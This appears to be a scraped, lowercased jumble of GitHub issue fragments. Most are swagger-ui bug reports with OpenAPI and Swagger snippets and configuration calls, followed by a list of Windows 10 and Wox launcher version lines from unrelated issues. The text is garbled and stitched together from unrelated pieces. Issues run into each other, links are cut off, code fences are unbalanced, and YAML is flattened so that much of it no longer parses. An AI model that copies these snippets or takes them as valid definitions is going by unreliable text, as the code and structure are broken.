``` testb.yaml
get: responses: 200: description: ok content: application/json: schema: type: object properties: id: type: string
**swagger ui is used inside react component
react version is `^16.3.2`** example swagger/openapi definition: swagger-ui configuration options:
swaggerui({ dom_id: "#swagger", url: spec_url,
example swagger/openapi definition:
openapi: 3.0.1
info: version: 1.0.0 title: swagger petstore
paths: /pets: get: summary: list all pets responses: '200': description: a paged array of pets
servers: - url: 'http://{client}.domain.com/api' variables: client: default: acme
components: securityschemes: login: type: oauth2 flows: password: tokenurl: oauth/v2/token
example swagger/openapi definition:
swagger: "2.0"
info: description: this is a simple api version: 1.0.0 title: simple inventory api paths: /inventory: get: responses: 200: description: search results matching criteria 400: description: bad input parameter
definitions: inventoryitem: type: object
i have a frontend app using vue.js (2.5.16) along with vie-cli 3.0 (webpack 4) and swagger-ui (3.17.3):
the same problem with vue-cli 2.0:
when i run in localhost the entire definition is displayed correctly, but when i create the version to production (npm run build) and i am deploying on pivotal cloud foundry using the staticbuildpack i cannot see the example value or model inside of the black boxes (see screenshots below) swagger/openapi definition:
swagger-ui configuration options:
import swaggeruibundle from 'swagger-ui'
import 'swagger-ui/dist/swagger-ui.css' swaggeruibundle({ url: ' dom_id: '#swagger-ui', deeplinking: false, presets: [ swaggeruibundle.presets.apis ], plugins: [ swaggeruibundle.plugins.downloadurl ] })
example swagger/openapi definition:
```yaml # we use json, i convert to yaml
you can check the attachment files.
--- openapi: 3.0.0
info: version: '' title: com.sap.gtt.app.deliverysample.deliverywriteservice
paths: "/deliveryprocess/deliveryprocess": post: summary: \'\' operationid: \'\' tags: - deliveryprocess responses: \'200\': description: expected response to a valid request content: application/json: schema: type: string default: description: unexpected error content: application/json: schema: "$ref": "#/components/schemas/error" requestbody: description: \'\' required: true content: application/json: schema: "$ref": "#/components/schemas/deliveryprocess"
components: schemas: deliveryprocess: properties: trackingids: type: array items: "$ref": "#/components/schemas/qualifiedtrackingid" altkey: maxlength: 255 type: string processevents: type: array items: "$ref": "#/components/schemas/processeventdirectory" deliveryid: maxlength: 10 type: string salesorderid: maxlength: 10 type: string shiptoparty: type: string maxlength: 255 soldtoparty: type: string maxlength: 255 salesorganization: maxlength: 4 type: string deliverydate: type: string format: date loadingdate: type: string format: date transplandate: type: string format: date shippingpoint: type: string maxlength: 255 deliveryweight: multipleof: 0.001 maximum: 999999999999.999 minimum: -999999999999.999 type: number format: decimal deliverynetweight: multipleof: 0.001 maximum: 999999999999.999 minimum: -999999999999.999 type: number format: decimal deliveryweightunit: maxlength: 6 type: string deliveryvolume: multipleof: 0.001 maximum: 999999999999.999 minimum: -999999999999.999 type: number format: decimal deliveryvolumeunit: maxlength: 6 type: string shippingtype: enum: - \'01\' - \'02\' - \'03\' - \'04\' - \'05\' - du - lg - lt - mm - p1 - p2 - p3 - wm maxlength: 20 type: string purchaseorderid: maxlength: 20 type: string numberofpackages: type: integer format: int32 deliverystatus: enum: - \'01\' - \'02\' maxlength: 2 type: string shippingstatus: enum: - \'01\' - \'02\' - \'03\' - \'04\' maxlength: 50 type: string items: type: array items: "$ref": "#/components/schemas/deliveryitem" qualifiedtrackingid: properties: altkey: maxlength: 255 type: string validfromutc: type: string format: timestamp validtoutc: type: string format: timestamp processeventdirectory: properties: eventtype: maxlength: 255 type: string location: type: string maxlength: 255 plannedtechnicaltimestamp: type: string format: timestamp plannedbusinesstimestamp: type: string format: timestamp objectreference: properties: obstype: enum: - parent - child maxlength: 50 type: string objkey: maxlength: 255 type: string observeradddeletebybussyskey: properties: altkey: maxlength: 255 type: string validfromutc: type: string format: timestamp validtoutc: type: string format: timestamp action: enum: - a - d maxlength: 50 type: string swagger-ui configuration options:
swaggerui({ swaggeruibundle({ spec: _getspec(), //i write a function to get the json supportedsubmitmethods: [], dom_id: \'#another-swagger-ui\', deeplinking: true, presets: [ swaggeruibundle.presets.apis, swaggeruistandalonepreset ], plugins: [ swaggeruibundle.plugins.downloadurl ], layout: "standalonelayout" })
``` ``` ```
formdata field with type:string, required: true and enum fields, whatever you choose, it always send the first enum value
example swagger/openapi definition: add one field to the official pet store example, whatever you choose, it will always send hello
``` - in: formdata name: type type: string required: true enum: - hello - world
define four level inheritance like in my schema and try to use the last one example swagger/openapi definition:
```json "definitions": { "profile_list": { "type": "object", "properties": { "id": {"type": "integer"} } }, "profile_details": { "allof": [{ "$ref": "#/definitions/profile_list" }, { "type": "object", "properties": { "first_name": {"type": "string"} } }] }, "profile_details_extended": { "allof": [ { "$ref": "#/definitions/profile_details" }, { "type": "object", "properties": { "last_name": {"type": "string"} } } ] }, "profile_details_extended_again": { "allof": [ { "$ref": "#/definitions/profile_details_extended" }, { "type": "object", "properties": { "email": {"type": "string"} } } ] } } ..
in paths: ..
"post": { "operationid": "profiles_create", "responses": { "201": { "description": "test", "schema": { "$ref": "#/definitions/profile_details_extended_again" } } }
``` swagger-ui configuration options:
swaggeruibundle({ url: "schema.json", dom_id: \'#swagger-ui\', deeplinking: true, docexpansion: \'none\', presets: [ swaggeruibundle.presets.apis, swaggeruistandalonepreset ], plugins: [ swaggeruibundle.plugins.downloadurl ], layout: "standalonelayout"
example swagger/openapi definition:
swagger: '2.0'
basepath: '/'
info: title: 'health insurance system api' version: '1.0.0' description: | system for storing beneficiaries' health insurance information for the third-party liability group
update active coverage or query the carrier code master file.
i've reproduced this locally, but even easier to demonstrate, petstore has the same issue
example swagger/openapi definition:
snippet from swagger.json
``` responses: 200: description: "successful operation" schema: type: "array" items: $ref: "#/definitions/pet"
example swagger/openapi definition:
openapi: '3.0.1'
info: title: 'title' version: 1.0.0
paths: /path: post: responses: '201': description: 'description' requestbody: required: true content: multipart/form-data: schema: type: object properties: json: type: object example: a: string properties: a: type: string
``` swagger-ui configuration options: i don't know the configuration
this bug happens on and also on [swagger-ui-watcher](
swagger/openapi definition: ```yaml requestbody: description: user info to be filled content: application/x-www-form-urlencoded: schema: type: object required: - username - name properties: username: type: string description: user identity name: type: string description: user name phone_number: type: string pattern: '/\\d{11}/' description: phone number ```
![_20180613215633]( swagger-ui configuration options: ```js swaggerui({ }) ``` ``` ``` ### is your feature request related to a problem?
* property descriptions are not shown
* required properties are not starred
* required properties checking, string regex pattern checking is not performed when try swagger client however, parameters are ideally shown
there should be no much difference between parameters and body form data
### describe the solution you'd like
<!-- a clear and concise description of what you want to happen
--> ### describe alternatives you've considered
<!-- a clear and concise description of any alternative solutions or features you've considered.
--> ### additional context
<!-- add any other context or screenshots about the feature request here
example swagger/openapi definition:
openapi: '3.0.1'
info: description: some docs for a bug title: test title version: '1.0.0' servers: - url: paths: /ping: get: responses: '200': description: ok content: text/plain: schema: type: string example: pong security: - oauth2firstparty: [] components: securityschemes: oauth2firstparty: type: oauth2 description: first party native app authentication facilitated by resource owner password credentials grant flows: password: tokenurl: oauth/token refreshurl: oauth/refresh scopes: {}
example swagger/openapi definition:
petstore demo: swagger-ui configuration options:
default configuration - npm run dev
example swagger/openapi definition: [json config](
swagger/openapi definition: ```yaml
components: examples: examplemodel: value: { "name": "adam jacobson", "email": null, } ``` ### is your feature request related to a problem?
yaml is a superset of json and hence supports "null" as a value of a json property
it is actually a fairly common use-case for a field to be null (for example, patch a property as null to remove it, default values being null)
however the editor will display a null value in a json example as empty object { }, which is not accurate and is very annoying
### describe the solution you'd like
editor to print json null as **null** in the example dialogues - for instance, as it would appear in postman
### describe alternatives you've considered
i have not, i think it should be consistent with the json standard and other tools
### additional context
none thank you _copied from original issue: swagger-api/swagger-editor#1758_
[here's an example repo](
take a look at public/good.html and public/bad.html
example swagger/openapi definition:
{"swagger":"2.0","info":{"version":"v1","title":"my api"},"paths":{"/api/values/a-b":{"get":{"tags":["values"],"operationid":"apivaluesa-bget","consumes":[],"produces":[],"responses":{"200":{"description":"success"}}}}},"definitions":{}}```
openapi definition:
openapi: 3.0.0
info: title: test version: test
paths: '/test': get: parameters: - $ref: '#/components/parameters/testparam' responses: '200': description: successful response
components: parameters: testparam: name: testhaeder in: header schema: type: string default: 'test-value'
``` swagger-ui configuration options:
const ui = swaggeruibundle({ urls: [{url: "openapi.yaml", name: "api"}], dom_id: \'#swagger-ui\', deeplinking: true, presets: [ swaggeruibundle.presets.apis, swaggeruistandalonepreset ], plugins: [ swaggeruibundle.plugins.downloadurl ], layout: "standalonelayout", validatorurl: null })
``` ### the bug encountered
the default value as stated in the openapi definition above doesn't appear on the swagger-ui.
example swagger/openapi definitions ```yaml
swagger: "2.0"
definitions: one: title: un two: title: deux three: allof: - $ref: "#/definitions/one" - $ref: "#/definitions/two" - title: trois # try commenting this out other: $ref: "#/definitions/one"
example swagger/openapi definition: use the petstore demo and change one of the tags to multiple words, e.g.:
{ "tags": [ { "name": "pet store" } ] "paths": { "/pet": { "post": { "tags": [ "pet store" ], } } }
``` swagger-ui configuration options: just use the petstore demo and change the link to your adapted swaggerfile:
const ui = swaggeruibundle({ url: " " // ...
example swagger/openapi definitions 2.0:
swagger: '2.0'
info: version: 0.0.0 title: test
paths: {} definitions: error404: title: not found
openapi: 3.0.1
info: version: 0.0.0 title: test
paths: {} components: schemas: error404: title: not found
providing larger json samples inside the x-examples section will cause data to get rendered outside the table in swagger 3
older version of editor.swagger.io (2.x) doesn't do this
example swagger/openapi definition:
swagger: '2.0'
info: title: jobs service server version: v1 (1.23.26)
host: www.printos.com
basepath: /api/jobs-service/v1
tags: - name: admin description: rest apis for admin - name: jobs description: rest apis for jobs
schemes: - https
paths: /jobs: post: consumes: - application/json description: >- retrieves a list of existing jobs for all devices in the user's printos organization
responses: \'200\': schema: $ref: \'#/definitions/jobs\' description: successful operation summary: retrieve jobs operationid: retrievejobs produces: - application/json tags: - jobs parameters: - required: true name: context in: body x-examples: active: >- {"timezone":"america/denver","filterexpression":{"and":[{"or":[{"columnid":"jobprogress","op":"equals","value":"ready","isserverfilter":true},{"columnid":"jobprogress","op":"equals","value":"ripping","isserverfilter":true},{"columnid":"jobprogress","op":"equals","value":"ripped","isserverfilter":true}],"isserverfilter":true},{"columnid":"locationtype","op":"notequal","value":"deleted","isserverfilter":true}]}}
``` swagger-ui configuration options:
swaggerui({ able to reproduce this with the editor.swagger.io webpage and our deployment using 3.9.1
``` ``` ```
- windows 10 version: 2004 (os build 19041.572) - wox version: 1.4.1196
- windows 10 version: pro 1909 (i think) - wox version 1.4.1196
- windows 10 version: 1909 - wox version: 1.4.1196
- windows 10 version: 2004, os build 19041.572
- wox version: master / 1.5.0
- windows 10 version: 2004, os build 19041.572 - wox version: **master** / 1.5.0
- windows 10 version: 20h2 - 19042.546 - wox version 1.4.1196
- windows 10 version: 2004 - wox version 1.4.1196
- windows 10 version: 2004 - wox version 1.3.524
- windows 10 version: 1903 18362.1016 - wox version: 1.4.1196 **error window text**
see the end of this issue
it's too long.
- windows 10 version: pro - 10.0.18363 - wox version: 1.4.1196
- windows 10 version: 19041.450 - wox version: 1.4.1196
- windows 10 version: 19041.450 - wox version: 1.4.1196
- windows 10 version: [version 10.0.19041.388] - wox version: 1.4.1196 (python3 and everything search tool were installed manually, not as a part of [...]full_installer.exe) ###
- windows 10 version: - wox version
- windows 10 version: 1903 - wox version:1.3.524
- windows 10 version: windows 10 20h2 19042.388 - wox version: 1.4.1196
- windows 10 version: 1909 - wox version: tested on 1.3.881 and 1.4.1196
-windows 10 version: 1903 18362.900 -wox version: 1.3.524
- windows 10 version: 1909 - wox version: 1.4.1196 expected behavior (wox-1.4.1129)
![wox-1 4 1129]( missing file description (wox-1.4.1196)
![wox-1 4 1196](
- windows 10 version: windows 10 home single language - wox version: latest version
- windows 10 version: 1903 - wox version 1.3.1073
- windows 10 version: - wox version: 1196
- windows 10 version: 1909 build 18363.836 - wox version: 1.4.1129 (i'm using portable version right now)
- windows 10 version: 1909 / 18363.778 - wox version: 1.3.524
- windows 10 version: 2004, build 19608.1006 - wox version: 1.3.1039
- windows 10 version: 1909 - wox version: 1.4.1129
- windows 10 version: 1909 - wox version:1.3.1073
- windows 10 version: win 10 build 10.0.18363.836 - wox version: v1.3.1034
- windows 10 version: windows 10 professional 1909 18363.78 - wox version
- windows 10 version: `win 1909 buld 18363.778` - wox version: `1.3.996`
